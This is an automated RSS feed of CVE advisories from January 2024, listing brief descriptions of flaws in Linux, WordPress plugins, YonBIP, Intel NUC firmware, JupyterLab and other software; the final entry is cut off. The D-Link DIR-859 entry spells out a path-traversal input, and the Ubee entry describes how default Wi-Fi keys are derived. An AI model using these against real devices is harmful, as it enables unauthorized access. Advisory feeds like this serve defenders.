<?xml version='1.0' encoding='UTF-8'?>
<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>New CVE from cve.org feed</title><link>https://github.com/test.xml</link><description>Last 2 days CVE feed!</description><atom:link href="https://github.com/test.xml" rel="self"/><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><language>en</language><lastBuildDate>Sun, 21 Jan 2024 15:49:08 +0000</lastBuildDate><item><title>CVE-2023-6531 | Kernel: gc&amp;#x27;s deletion of an skb races with unix_stream_read_generic()  leading to uaf</title><link>https://www.cve.org/CVERecord?id=CVE-2023-6531</link><description>A use-after-free flaw was found in the Linux Kernel due to a race problem in the unix garbage collector's deletion of SKB races with unix_stream_read_generic() on the socket that the SKB is queued on.</description><pubDate>Sun, 21 Jan 2024 15:49:09 +0000</pubDate></item><item><title>CVE-2024-0769 | D-Link DIR-859 HTTP POST Request hedwig.cgi path traversal</title><link>https://www.cve.org/CVERecord?id=CVE-2024-0769</link><description>** UNSUPPORTED WHEN ASSIGNED ** A vulnerability was found in D-Link DIR-859 1.06B01. It has been rated as critical. Affected by this issue is some unknown functionality of the file /hedwig.cgi of the component HTTP POST Request Handler. The manipulation of the argument service with the input ../../../../htdocs/webinc/getcfg/DHCPS6.BRIDGE-1.xml leads to path traversal. The attack may be launched remotely. The exploit has been disclosed to the public and may be used. VDB-251666 is the identifier assigned to this vulnerability. NOTE: This vulnerability only affects products that are no longer supported by the maintainer. NOTE: Vendor was contacted early and confirmed immediately that the product is end-of-life. It should be retired and replaced.</description><pubDate>Sun, 21 Jan 2024 15:49:10 +0000</pubDate></item><item><title>CVE-2016-15037 | go4rayyan Scumblr Task cross site scripting</title><link>https://www.cve.org/CVERecord?id=CVE-2016-15037</link><description>A vulnerability, which was classified as problematic, has been found in go4rayyan Scumblr up to 2.0.1a. Affected by this issue is some unknown functionality of the component Task Handler. The manipulation leads to cross site scripting. The attack may be launched remotely. Upgrading to version 2.0.2 is able to address this issue. The patch is identified as 5c9120f2362ddb7cbe48f2c4620715adddc4ee35. It is recommended to upgrade the affected component. VDB-251570 is the identifier assigned to this vulnerability.</description><pubDate>Sun, 21 Jan 2024 15:49:11 +0000</pubDate></item><item><title>CVE-2024-23726 | Ubee DDW365 XCNDDW365 and DDW366 XCNDXW3WB devices have predictable default WPA2 PSKs that could lead to unauthorized remote access. A remot...</title><link>https://www.cve.org/CVERecord?id=CVE-2024-23726</link><description>Ubee DDW365 XCNDDW365 and DDW366 XCNDXW3WB devices have predictable default WPA2 PSKs that could lead to unauthorized remote access. A remote attacker (in proximity to a Wi-Fi network) can derive the default WPA2-PSK value by observing a beacon frame. A PSK is generated by using the first six characters of the SSID and the last six of the BSSID, decrementing the last digit.</description><pubDate>Sun, 21 Jan 2024 15:49:12 +0000</pubDate></item><item><title>CVE-2024-23725 | Ghost before 5.76.0 allows XSS via a post excerpt in excerpt.js. An XSS payload can be rendered in post summaries.</title><link>https://www.cve.org/CVERecord?id=CVE-2024-23725</link><description>Ghost before 5.76.0 allows XSS via a post excerpt in excerpt.js. An XSS payload can be rendered in post summaries.</description><pubDate>Sun, 21 Jan 2024 15:49:12 +0000</pubDate></item><item><title>CVE-2024-0521 | Code Injection in paddlepaddle/paddle</title><link>https://www.cve.org/CVERecord?id=CVE-2024-0521</link><description>Code Injection in paddlepaddle/paddle</description><pubDate>Sun, 21 Jan 2024 15:49:13 +0000</pubDate></item><item><title>CVE-2023-7063 | The WPForms Pro plugin for WordPress is vulnerable to Stored Cross-Site Scripting via form submission parameters in all versions up to, and ...</title><link>https://www.cve.org/CVERecord?id=CVE-2023-7063</link><description>The WPForms Pro plugin for WordPress is vulnerable to Stored Cross-Site Scripting via form submission parameters in all versions up to, and including, 1.8.5.3 due to insufficient input sanitization and output escaping. This makes it possible for unauthenticated attackers to inject arbitrary web scripts in pages that will execute whenever a user accesses an injected page.</description><pubDate>Sun, 21 Jan 2024 15:49:14 +0000</pubDate></item><item><title>CVE-2024-0623 | The VK Block Patterns plugin for WordPress is vulnerable to Cross-Site Request Forgery in all versions up to, and including, 1.31.1.1. This ...</title><link>https://www.cve.org/CVERecord?id=CVE-2024-0623</link><description>The VK Block Patterns plugin for WordPress is vulnerable to Cross-Site Request Forgery in all versions up to, and including, 1.31.1.1. This is due to missing or incorrect nonce validation on the vbp_clear_patterns_cache() function. This makes it possible for unauthenticated attackers to clear the patterns cache via a forged request granted they can trick a site administrator into performing an action such as clicking on a link.</description><pubDate>Sun, 21 Jan 2024 15:49:15 +0000</pubDate></item><item><title>CVE-2024-0679 | The ColorMag theme for WordPress is vulnerable to unauthorized access due to a missing capability check on the plugin_action_callback() func...</title><link>https://www.cve.org/CVERecord?id=CVE-2024-0679</link><description>The ColorMag theme for WordPress is vulnerable to unauthorized access due to a missing capability check on the plugin_action_callback() function in all versions up to, and including, 3.1.2. This makes it possible for authenticated attackers, with subscriber-level access and above, to install and activate arbitrary plugins.</description><pubDate>Sun, 21 Jan 2024 15:49:15 +0000</pubDate></item><item><title>CVE-2023-46447 | The POPS! Rebel application 5.0 for Android, in POPS! Rebel Bluetooth Glucose Monitoring System, sends unencrypted glucose measurements over...</title><link>https://www.cve.org/CVERecord?id=CVE-2023-46447</link><description>The POPS! Rebel application 5.0 for Android, in POPS! Rebel Bluetooth Glucose Monitoring System, sends unencrypted glucose measurements over BLE.</description><pubDate>Sun, 21 Jan 2024 15:49:16 +0000</pubDate></item><item><title>CVE-2023-47024 | Cross Site Request Forgery vulnerability in NCR Terminal Handler v.1.5.1 allows a remote attacker to obtain sensitive information and escala...</title><link>https://www.cve.org/CVERecord?id=CVE-2023-47024</link><description>Cross Site Request Forgery vulnerability in NCR Terminal Handler v.1.5.1 allows a remote attacker to obtain sensitive information and escalate privileges via a crafted script to the UserSelfService component.</description><pubDate>Sun, 21 Jan 2024 15:49:17 +0000</pubDate></item><item><title>CVE-2023-51906 | An issue in yonyou YonBIP v3_23.05 allows a remote attacker to execute arbitrary code via a crafted script to the ServiceDispatcherServlet u...</title><link>https://www.cve.org/CVERecord?id=CVE-2023-51906</link><description>An issue in yonyou YonBIP v3_23.05 allows a remote attacker to execute arbitrary code via a crafted script to the ServiceDispatcherServlet uap.framework.rc.itf.IResourceManager component.</description><pubDate>Sun, 21 Jan 2024 15:49:18 +0000</pubDate></item><item><title>CVE-2023-51924 | An arbitrary file upload vulnerability in the uap.framework.rc.itf.IResourceManager interface of YonBIP v3_23.05 allows attackers to execute...</title><link>https://www.cve.org/CVERecord?id=CVE-2023-51924</link><description>An arbitrary file upload vulnerability in the uap.framework.rc.itf.IResourceManager interface of YonBIP v3_23.05 allows attackers to execute arbitrary code via uploading a crafted file.</description><pubDate>Sun, 21 Jan 2024 15:49:18 +0000</pubDate></item><item><title>CVE-2023-51925 | An arbitrary file upload vulnerability in the nccloud.web.arcp.taskmonitor.action.ArcpUploadAction.doAction() method of YonBIP v3_23.05 allo...</title><link>https://www.cve.org/CVERecord?id=CVE-2023-51925</link><description>An arbitrary file upload vulnerability in the nccloud.web.arcp.taskmonitor.action.ArcpUploadAction.doAction() method of YonBIP v3_23.05 allows attackers to execute arbitrary code via uploading a crafted file.</description><pubDate>Sun, 21 Jan 2024 15:49:18 +0000</pubDate></item><item><title>CVE-2021-31314 | File upload vulnerability in ejinshan v8+ terminal security system allows attackers to upload arbitrary files to arbitrary locations on the ...</title><link>https://www.cve.org/CVERecord?id=CVE-2021-31314</link><description>File upload vulnerability in ejinshan v8+ terminal security system allows attackers to upload arbitrary files to arbitrary locations on the server.</description><pubDate>Sun, 21 Jan 2024 15:49:19 +0000</pubDate></item><item><title>CVE-2023-51892 | An issue in weaver e-cology v.10.0.2310.01 allows a remote attacker to execute arbitrary code via a crafted script to the FrameworkShellCont...</title><link>https://www.cve.org/CVERecord?id=CVE-2023-51892</link><description>An issue in weaver e-cology v.10.0.2310.01 allows a remote attacker to execute arbitrary code via a crafted script to the FrameworkShellController component.</description><pubDate>Sun, 21 Jan 2024 15:49:19 +0000</pubDate></item><item><title>CVE-2023-51926 | YonBIP v3_23.05 was discovered to contain an arbitrary file read vulnerability via the nc.bs.framework.comn.serv.CommonServletDispatcher com...</title><link>https://www.cve.org/CVERecord?id=CVE-2023-51926</link><description>YonBIP v3_23.05 was discovered to contain an arbitrary file read vulnerability via the nc.bs.framework.comn.serv.CommonServletDispatcher component.</description><pubDate>Sun, 21 Jan 2024 15:49:20 +0000</pubDate></item><item><title>CVE-2023-51927 | YonBIP v3_23.05 was discovered to contain a SQL injection vulnerability via the com.yonyou.hrcloud.attend.web.AttendScriptController.runScri...</title><link>https://www.cve.org/CVERecord?id=CVE-2023-51927</link><description>YonBIP v3_23.05 was discovered to contain a SQL injection vulnerability via the com.yonyou.hrcloud.attend.web.AttendScriptController.runScript() method.</description><pubDate>Sun, 21 Jan 2024 15:49:20 +0000</pubDate></item><item><title>CVE-2023-51928 | An arbitrary file upload vulnerability in the nccloud.web.arcp.taskmonitor.action.ArcpUploadAction.doAction() method of YonBIP v3_23.05 allo...</title><link>https://www.cve.org/CVERecord?id=CVE-2023-51928</link><description>An arbitrary file upload vulnerability in the nccloud.web.arcp.taskmonitor.action.ArcpUploadAction.doAction() method of YonBIP v3_23.05 allows attackers to execute arbitrary code via uploading a crafted file.</description><pubDate>Sun, 21 Jan 2024 15:49:21 +0000</pubDate></item><item><title>CVE-2024-23332 | Client configured with permissive trust policies susceptible to rollback attack in Notary Project</title><link>https://www.cve.org/CVERecord?id=CVE-2024-23332</link><description>The Notary Project is a set of specifications and tools intended to provide a cross-industry standard for securing software supply chains by using authentic container images and other OCI artifacts. An external actor with control of a compromised container registry can provide outdated versions of OCI artifacts, such as Images. This could lead artifact consumers with relaxed trust policies (such as `permissive` instead of `strict`) to potentially use artifacts with signatures that are no longer valid, making them susceptible to any exploits those artifacts may contain. In Notary Project, an artifact publisher can control the validity period of artifact by specifying signature expiry during the signing process. Using shorter signature validity periods along with processes to periodically resign artifacts, allows artifact producers to ensure that their consumers will only receive up-to-date artifacts. Artifact consumers should correspondingly use a `strict` or equivalent trust policy that enforces signature expiry. Together these steps enable use of up-to-date artifacts and safeguard against rollback attack in the event of registry compromise. The Notary Project offers various signature validation options such as `permissive`, `audit` and `skip` to support various scenarios. These scenarios includes 1) situations demanding urgent workload deployment, necessitating the bypassing of expired or revoked signatures; 2) auditing of artifacts lacking signatures without interrupting workload; and 3) skipping of verification for specific images that might have undergone validation through alternative mechanisms. Additionally, the Notary Project supports revocation to ensure the signature freshness. Artifact publishers can sign with short-lived certificates and revoke older certificates when necessary. This revocation serves as a signal to inform artifact consumers that the corresponding unexpired artifact is no longer approved by the publisher. This enables the artifact publisher to control the validity of the signature independently of their ability to manage artifacts in a compromised registry.</description><pubDate>Sun, 21 Jan 2024 15:49:21 +0000</pubDate></item><item><title>CVE-2024-0739 | Hecheng Leadshop leadshop.php deserialization</title><link>https://www.cve.org/CVERecord?id=CVE-2024-0739</link><description>A vulnerability, which was classified as critical, was found in Hecheng Leadshop up to 1.4.20. Affected is an unknown function of the file /web/leadshop.php. The manipulation of the argument install leads to deserialization. It is possible to launch the attack remotely. The exploit has been disclosed to the public and may be used. VDB-251562 is the identifier assigned to this vulnerability.</description><pubDate>Sun, 21 Jan 2024 15:49:22 +0000</pubDate></item><item><title>CVE-2024-0737 | Xlightftpd Xlight FTP Server Login denial of service</title><link>https://www.cve.org/CVERecord?id=CVE-2024-0737</link><description>A vulnerability classified as problematic was found in Xlightftpd Xlight FTP Server 1.1. This vulnerability affects unknown code of the component Login. The manipulation of the argument user leads to denial of service. The attack can be initiated remotely. The exploit has been disclosed to the public and may be used. The identifier of this vulnerability is VDB-251560.</description><pubDate>Sun, 21 Jan 2024 15:49:23 +0000</pubDate></item><item><title>CVE-2024-0738 | 个人开源 mldong DecisionModel.java ExpressionEngine code injection</title><link>https://www.cve.org/CVERecord?id=CVE-2024-0738</link><description>A vulnerability, which was classified as critical, has been found in 个人开源 mldong 1.0. This issue affects the function ExpressionEngine of the file com/mldong/modules/wf/engine/model/DecisionModel.java. The manipulation leads to code injection. The attack may be initiated remotely. The exploit has been disclosed to the public and may be used. The identifier VDB-251561 was assigned to this vulnerability.</description><pubDate>Sun, 21 Jan 2024 15:49:23 +0000</pubDate></item><item><title>CVE-2024-23688 | Consensys Discovery Nonce Reuse</title><link>https://www.cve.org/CVERecord?id=CVE-2024-23688</link><description>Consensys Discovery versions less than 0.4.5 uses the same AES/GCM nonce for the entire session. which should ideally be unique for every message. The node's private key isn't compromised, only the session key generated for specific peer communication is exposed.</description><pubDate>Sun, 21 Jan 2024 15:49:24 +0000</pubDate></item><item><title>CVE-2024-23686 | DependencyCheck Debug Mode Logging of NVD API Key</title><link>https://www.cve.org/CVERecord?id=CVE-2024-23686</link><description>DependencyCheck for Maven 9.0.0 to 9.0.6, for CLI version 9.0.0 to 9.0.5, and for Ant versions 9.0.0 to 9.0.5, when used in debug mode, allows an attacker to recover the NVD API Key from a log file.</description><pubDate>Sun, 21 Jan 2024 15:49:25 +0000</pubDate></item><item><title>CVE-2024-23687 | FOLIO mod-data-export-spring Hard-Coded Credentials</title><link>https://www.cve.org/CVERecord?id=CVE-2024-23687</link><description>Hard-coded credentials in FOLIO mod-data-export-spring versions before 1.5.4 and from 2.0.0 to 2.0.2 allows unauthenticated users to access critical APIs, modify user data, modify configurations including single-sign-on, and manipulate fees/fines.</description><pubDate>Sun, 21 Jan 2024 15:49:25 +0000</pubDate></item><item><title>CVE-2024-23685 | FOLIO mod-remote-storage Hard Coded Credentials</title><link>https://www.cve.org/CVERecord?id=CVE-2024-23685</link><description>Hard-coded credentials in mod-remote-storage versions under 1.7.2 and from 2.0.0 to 2.0.3 allows unauthorized users to gain read access to mod-inventory-storage records including instances, holdings, items, contributor-types, and identifier-types.</description><pubDate>Sun, 21 Jan 2024 15:49:26 +0000</pubDate></item><item><title>CVE-2024-23689 | ClickHouse Client Certificate Password Exposure</title><link>https://www.cve.org/CVERecord?id=CVE-2024-23689</link><description>Exposure of sensitive information in exceptions in ClichHouse's clickhouse-r2dbc, com.clickhouse:clickhouse-jdbc, and com.clickhouse:clickhouse-client versions less than 0.4.6 allows unauthorized users to gain access to client certificate passwords via client exception logs. This occurs when 'sslkey' is specified and an exception, such as a ClickHouseException or SQLException, is thrown during database operations; the certificate password is then included in the logged exception message.</description><pubDate>Sun, 21 Jan 2024 15:49:27 +0000</pubDate></item><item><title>CVE-2024-0735 | SourceCodester Online Tours &amp;amp; Travels Management System expense.php exec sql injection</title><link>https://www.cve.org/CVERecord?id=CVE-2024-0735</link><description>A vulnerability was found in SourceCodester Online Tours &amp; Travels Management System 1.0. It has been rated as critical. Affected by this issue is the function exec of the file admin/operations/expense.php. The manipulation leads to sql injection. The attack may be launched remotely. The exploit has been disclosed to the public and may be used. VDB-251558 is the identifier assigned to this vulnerability.</description><pubDate>Sun, 21 Jan 2024 15:49:28 +0000</pubDate></item><item><title>CVE-2024-0736 | EFS Easy File Sharing FTP Login denial of service</title><link>https://www.cve.org/CVERecord?id=CVE-2024-0736</link><description>A vulnerability classified as problematic has been found in EFS Easy File Sharing FTP 3.6. This affects an unknown part of the component Login. The manipulation of the argument password leads to denial of service. It is possible to initiate the attack remotely. The exploit has been disclosed to the public and may be used. The associated identifier of this vulnerability is VDB-251559.</description><pubDate>Sun, 21 Jan 2024 15:49:28 +0000</pubDate></item><item><title>CVE-2024-23684 | upokecenter CBOR Denial of Service</title><link>https://www.cve.org/CVERecord?id=CVE-2024-23684</link><description>Inefficient algorithmic complexity in DecodeFromBytes function in com.upokecenter.cbor Java implementation of Concise Binary Object Representation (CBOR) versions 4.0.0 to 4.5.1 allows an attacker to cause a denial of service by passing a maliciously crafted input. Depending on an application's use of this library, this may be a remote attacker.</description><pubDate>Sun, 21 Jan 2024 15:49:28 +0000</pubDate></item><item><title>CVE-2024-23681 | Artemis Java Test Sandbox Libary Load Escape</title><link>https://www.cve.org/CVERecord?id=CVE-2024-23681</link><description>Artemis Java Test Sandbox versions before 1.11.2 are vulnerable to a sandbox escape when an attacker loads untrusted libraries using System.load or System.loadLibrary. An attacker can abuse this issue to execute arbitrary Java when a victim executes the supposedly sandboxed code.</description><pubDate>Sun, 21 Jan 2024 15:49:29 +0000</pubDate></item><item><title>CVE-2024-22420 | Stored cross site scripting in Markdown Preview in JupyterLab</title><link>https://www.cve.org/CVERecord?id=CVE-2024-22420</link><description>JupyterLab is an extensible environment for interactive and reproducible computing, based on the Jupyter Notebook and Architecture. This vulnerability depends on user interaction by opening a malicious Markdown file using JupyterLab preview feature. A malicious user can access any data that the attacked user has access to as well as perform arbitrary requests acting as the attacked user. JupyterLab version 4.0.11 has been patched. Users are advised to upgrade. Users unable to upgrade should disable the table of contents extension.</description><pubDate>Sun, 21 Jan 2024 15:49:30 +0000</pubDate></item><item><title>CVE-2024-22421 | Potential authentication and CSRF tokens leak in JupyterLab</title><link>https://www.cve.org/CVERecord?id=CVE-2024-22421</link><description>JupyterLab is an extensible environment for interactive and reproducible computing, based on the Jupyter Notebook and Architecture. Users of JupyterLab who click on a malicious link may get their `Authorization` and `XSRFToken` tokens exposed to a third party when running an older `jupyter-server` version. JupyterLab versions 4.1.0b2, 4.0.11, and 3.6.7 are patched. No workaround has been identified, however users should ensure to upgrade `jupyter-server` to version 2.7.2 or newer which includes a redirect vulnerability fix.</description><pubDate>Sun, 21 Jan 2024 15:49:30 +0000</pubDate></item><item><title>CVE-2024-23680 | AWS Encryption SDK for Java Improper Verification of Cryptographic Signature</title><link>https://www.cve.org/CVERecord?id=CVE-2024-23680</link><description>AWS Encryption SDK for Java versions 2.0.0 to 2.2.0 and less than 1.9.0 incorrectly validates some invalid ECDSA signatures.</description><pubDate>Sun, 21 Jan 2024 15:49:31 +0000</pubDate></item><item><title>CVE-2024-23683 | Artemis Java Test Sandbox InvocationTargetException Subclass Escape</title><link>https://www.cve.org/CVERecord?id=CVE-2024-23683</link><description>Artemis Java Test Sandbox versions less than 1.7.6 are vulnerable to a sandbox escape when an attacker crafts a special subclass of InvocationTargetException. An attacker can abuse this issue to execute arbitrary Java when a victim executes the supposedly sandboxed code.</description><pubDate>Sun, 21 Jan 2024 15:49:31 +0000</pubDate></item><item><title>CVE-2023-49329 | Anomali Match before 4.6.2 allows OS Command Injection. An authenticated admin user can inject and execute operating system commands. This a...</title><link>https://www.cve.org/CVERecord?id=CVE-2023-49329</link><description>Anomali Match before 4.6.2 allows OS Command Injection. An authenticated admin user can inject and execute operating system commands. This arises from improper handling of untrusted input, enabling an attacker to elevate privileges, execute system commands, and potentially compromise the underlying operating system. The fixed versions are 4.4.5, 4.5.4, and 4.6.2. The earliest affected version is 4.3.</description><pubDate>Sun, 21 Jan 2024 15:49:32 +0000</pubDate></item><item><title>CVE-2024-0733 | Smsot HTTP POST Request api.php sql injection</title><link>https://www.cve.org/CVERecord?id=CVE-2024-0733</link><description>A vulnerability was found in Smsot up to 2.12. It has been classified as critical. Affected is an unknown function of the file /api.php of the component HTTP POST Request Handler. The manipulation of the argument data[sign] leads to sql injection. It is possible to launch the attack remotely. The exploit has been disclosed to the public and may be used. The identifier of this vulnerability is VDB-251556.</description><pubDate>Sun, 21 Jan 2024 15:49:32 +0000</pubDate></item><item><title>CVE-2024-0734 | Smsot get.php sql injection</title><link>https://www.cve.org/CVERecord?id=CVE-2024-0734</link><description>A vulnerability was found in Smsot up to 2.12. It has been declared as critical. Affected by this vulnerability is an unknown functionality of the file /get.php. The manipulation of the argument tid leads to sql injection. The attack can be launched remotely. The exploit has been disclosed to the public and may be used. The identifier VDB-251557 was assigned to this vulnerability.</description><pubDate>Sun, 21 Jan 2024 15:49:33 +0000</pubDate></item><item><title>CVE-2024-23679 | Enonic XP Session Fixation Vulnerability</title><link>https://www.cve.org/CVERecord?id=CVE-2024-23679</link><description>Enonic XP versions less than 7.7.4 are vulnerable to a session fixation issue. An remote and unauthenticated attacker can use prior sessions due to the lack of invalidating session attributes.</description><pubDate>Sun, 21 Jan 2024 15:49:34 +0000</pubDate></item><item><title>CVE-2024-0758 | MolecularFaces XSS</title><link>https://www.cve.org/CVERecord?id=CVE-2024-0758</link><description>MolecularFaces before 0.3.0 is vulnerable to cross site scripting. A remote attacker can execute arbitrary JavaScript in the context of a victim browser via crafted molfiles.</description><pubDate>Sun, 21 Jan 2024 15:49:34 +0000</pubDate></item><item><title>CVE-2024-23682 | Artemis Java Test Sandbox Class Loading Escape</title><link>https://www.cve.org/CVERecord?id=CVE-2024-23682</link><description>Artemis Java Test Sandbox versions before 1.8.0 are vulnerable to a sandbox escape when an attacker includes class files in a package that Ares trusts. An attacker can abuse this issue to execute arbitrary Java when a victim executes the supposedly sandboxed code.</description><pubDate>Sun, 21 Jan 2024 15:49:35 +0000</pubDate></item><item><title>CVE-2023-28722 | Improper buffer restrictions for some Intel NUC BIOS firmware before version IN0048 may allow a privileged user to potentially enable escala...</title><link>https://www.cve.org/CVERecord?id=CVE-2023-28722</link><description>Improper buffer restrictions for some Intel NUC BIOS firmware before version IN0048 may allow a privileged user to potentially enable escalation of privilege via local access.</description><pubDate>Sun, 21 Jan 2024 15:49:36 +0000</pubDate></item><item><title>CVE-2023-28738 | Improper input validation for some Intel NUC BIOS firmware before version JY0070 may allow a privileged user to potentially enable escalatio...</title><link>https://www.cve.org/CVERecord?id=CVE-2023-28738</link><description>Improper input validation for some Intel NUC BIOS firmware before version JY0070 may allow a privileged user to potentially enable escalation of privilege via local access.</description><pubDate>Sun, 21 Jan 2024 15:49:36 +0000</pubDate></item><item><title>CVE-2023-28743 | Improper input validation for some Intel NUC BIOS firmware before version QN0073 may allow a privileged user to potentially enable escalatio...</title><link>https://www.cve.org/CVERecord?id=CVE-2023-28743</link><description>Improper input validation for some Intel NUC BIOS firmware before version QN0073 may allow a privileged user to potentially enable escalation of privilege via local access.</description><pubDate>Sun, 21 Jan 2024 15:49:36 +0000</pubDate></item><item><title>CVE-2023-29244 | Incorrect default permissions in some Intel Integrated Sensor Hub (ISH) driver for Windows 10 for Intel NUC P14E Laptop Element software ins...</title><link>https://www.cve.org/CVERecord?id=CVE-2023-29244</link><description>Incorrect default permissions in some Intel Integrated Sensor Hub (ISH) driver for Windows 10 for Intel NUC P14E Laptop Element software installers before version 5.4.1.4479 may allow an authenticated user to potentially enable escalation of privilege via local access.</description><pubDate>Sun, 21 Jan 2024 15:49:37 +0000</pubDate></item><item><title>CVE-2023-29495 | Improper input validation for some Intel NUC BIOS firmware before version IN0048 may allow a privileged user to potentially enable escalatio...</title><link>https://www.cve.org/CVERecord?id=CVE-2023-29495</link><description>Improper input validation for some Intel NUC BIOS firmware before version IN0048 may allow a privileged user to potentially enable escalation of privilege via local access.</description><pubDate>Sun, 21 Jan 2024 15:49:37 +0000</pubDate></item><item><title>CVE-2023-32272 | Uncontrolled search path in some Intel NUC Pro Software Suite Configuration Tool software installers before version 3.0.0.6 may allow an aut...</title><link>https://www.cve.org/CVERecord?id=CVE-2023-32272</link><description>Uncontrolled search path in some Intel NUC Pro Software Suite Configuration Tool software installers before version 3.0.0.6 may allow an authenticated user to potentially enable denial of service via local access.</description><pubDate>Sun, 21 Jan 2024 15:49:38 +0000</pubDate></item><item><title>CVE-2023-32544 | Improper access control in some Intel HotKey Services for Windows 10 for Intel NUC P14E Laptop Element software installers before version 1....</title><link>https://www.cve.org/CVERecord?id=CVE-2023-32544</link><description>Improper access control in some Intel HotKey Services for Windows 10 for Intel NUC P14E Laptop Element software installers before version 1.1.45 may allow an authenticated user to potentially enable denial of service via local access.</description><pubDate>Sun, 21 Jan 2024 15:49:38 +0000</pubDate></item><item><title>CVE-2023-38541 | Insecure inherited permissions in some Intel HID Event Filter drivers for Windows 10 for some Intel NUC laptop software installers before ve...</title><link>https://www.cve.org/CVERecord?id=CVE-2023-38541</link><description>Insecure inherited permissions in some Intel HID Event Filter drivers for Windows 10 for some Intel NUC laptop software installers before version 2.2.2.1 may allow an authenticated user to potentially enable escalation of privilege via local access.</description><pubDate>Sun, 21 Jan 2024 15:49:38 +0000</pubDate></item><item><title>CVE-2023-38587 | Improper input validation in some Intel NUC BIOS firmware may allow a privileged user to potentially enable escalation of privilege via loca...</title><link>https://www.cve.org/CVERecord?id=CVE-2023-38587</link><description>Improper input validation in some Intel NUC BIOS firmware may allow a privileged user to potentially enable escalation of privilege via local access.</description><pubDate>Sun, 21 Jan 2024 15:49:39 +0000</pubDate></item><item><title>CVE-2023-42429 | Improper buffer restrictions in some Intel NUC BIOS firmware may allow a privileged user to potentially enable escalation of privilege via l...</title><link>https://www.cve.org/CVERecord?id=CVE-2023-42429</link><description>Improper buffer restrictions in some Intel NUC BIOS firmware may allow a privileged user to potentially enable escalation of privilege via local access.</description><pubDate>Sun, 21 Jan 2024 15:49:39 +0000</pubDate></item><item><title>CVE-2023-42766 | Improper input validation in some Intel NUC 8 Compute Element BIOS firmware may allow a privileged user to potentially enable escalation of ...</title><link>https://www.cve.org/CVERecord?id=CVE-2023-42766</link><description>Improper input validation in some Intel NUC 8 Compute Element BIOS firmware may allow a privileged user to potentially enable escalation of privilege via local access.</description><pubDate>Sun, 21 Jan 2024 15:49:40 +0000</pubDate></item><item><title>CVE-2023-5080 | A privilege escalation vulnerability was reported in some Lenovo tablet products that could allow local applications access to device identi...</title><link>https://www.cve.org/CVERecord?id=CVE-2023-5080</link><description>A privilege escalation vulnerability was reported in some Lenovo tablet products that could allow local applications access to device identifiers and system commands.</description><pubDate>Sun, 21 Jan 2024 15:49:40 +0000</pubDate></item><item><title>CVE-2023-5081 | An information disclosure vulnerability was reported in the Lenovo Tab M8 HD that could allow a local application to gather a non-resettable...</title><link>https://www.cve.org/CVERecord?id=CVE-2023-5081</link><description>An information disclosure vulnerability was reported in the Lenovo Tab M8 HD that could allow a local application to gather a non-resettable device identifier.</description><pubDate>Sun, 21 Jan 2024 15:49:40 +0000</pubDate></item><item><title>CVE-2023-6043 | A privilege escalation vulnerability was reported in Lenovo Vantage that could allow a local attacker to bypass integrity checks and execute...</title><link>https://www.cve.org/CVERecord?id=CVE-2023-6043</link><description>A privilege escalation vulnerability was reported in Lenovo Vantage that could allow a local attacker to bypass integrity checks and execute arbitrary code with elevated privileges.</description><pubDate>Sun, 21 Jan 2024 15:49:41 +0000</pubDate></item><item><title>CVE-2023-6044 | A privilege escalation vulnerability was reported in Lenovo Vantage that could allow a local attacker with physical access to impersonate Le...</title><link>https://www.cve.org/CVERecord?id=CVE-2023-6044</link><description>A privilege escalation vulnerability was reported in Lenovo Vantage that could allow a local attacker with physical access to impersonate Lenovo Vantage Service and execute arbitrary code with elevated privileges.</description><pubDate>Sun, 21 Jan 2024 15:49:41 +0000</pubDate></item><item><title>CVE-2023-6450 | An incorrect permissions vulnerability was reported in the Lenovo App Store app that could allow an attacker to use system resources, result...</title><link>https://www.cve.org/CVERecord?id=CVE-2023-6450</link><description>An incorrect permissions vulnerability was reported in the Lenovo App Store app that could allow an attacker to use system resources, resulting in a denial of service.</description><pubDate>Sun, 21 Jan 2024 15:49:41 +0000</pubDate></item><item><title>CVE-2023-47035 | RPTC 0x3b08c was discovered to not conduct status checks on the parameter tradingOpen. This vulnerability can allow attackers to conduct una...</title><link>https://www.cve.org/CVERecord?id=CVE-2023-47035</link><description>RPTC 0x3b08c was discovered to not conduct status checks on the parameter tradingOpen. This vulnerability can allow attackers to conduct unauthorized transfer operations.</description><pubDate>Sun, 21 Jan 2024 15:49:42 +0000</pubDate></item><item><title>CVE-2024-0732 | PCMan FTP Server STOR Command denial of service</title><link>https://www.cve.org/CVERecord?id=CVE-2024-0732</link><description>A vulnerability was found in PCMan FTP Server 2.0.7 and classified as problematic. This issue affects some unknown processing of the component STOR Command Handler. The manipulation leads to denial of service. The attack may be initiated remotely. The exploit has been disclosed to the public and may be used. The associated identifier of this vulnerability is VDB-251555.</description><pubDate>Sun, 21 Jan 2024 15:49:43 +0000</pubDate></item><item><title>CVE-2023-50447 | Pillow through 10.1.0 allows PIL.ImageMath.eval Arbitrary Code Execution via the environment parameter, a different vulnerability than CVE-2...</title><link>https://www.cve.org/CVERecord?id=CVE-2023-50447</link><description>Pillow through 10.1.0 allows PIL.ImageMath.eval Arbitrary Code Execution via the environment parameter, a different vulnerability than CVE-2022-22817 (which was about the expression parameter).</description><pubDate>Sun, 21 Jan 2024 15:49:43 +0000</pubDate></item><item><title>CVE-2024-22211 | FreeRDP integer Overflow leading to Heap Overflow</title><link>https://www.cve.org/CVERecord?id=CVE-2024-22211</link><description>FreeRDP is a set of free and open source remote desktop protocol library and clients. In affected versions an integer overflow in `freerdp_bitmap_planar_context_reset` leads to heap-buffer overflow. This affects FreeRDP based clients. FreeRDP based server implementations and proxy are not affected. A malicious server could prepare a `RDPGFX_RESET_GRAPHICS_PDU` to allocate too small buffers, possibly triggering later out of bound read/write. Data extraction over network is not possible, the buffers are used to display an image. This issue has been addressed in version 2.11.5 and 3.2.0. Users are advised to upgrade. there are no know workarounds for this vulnerability.</description><pubDate>Sun, 21 Jan 2024 15:49:44 +0000</pubDate></item><item><title>CVE-2023-50693 | An issue in dom96 Jester v.0.6.0 and before allows a remote attacker to execute arbitrary code via a crafted request.</title><link>https://www.cve.org/CVERecord?id=CVE-2023-50693</link><description>An issue in dom96 Jester v.0.6.0 and before allows a remote attacker to execute arbitrary code via a crafted request.</description><pubDate>Sun, 21 Jan 2024 15:49:45 +0000</pubDate></item><item><title>CVE-2024-23329 | changedetection.io API endpoint is not secured with API token</title><link>https://www.cve.org/CVERecord?id=CVE-2024-23329</link><description>changedetection.io is an open source tool designed to monitor websites for content changes. In affected versions the API endpoint 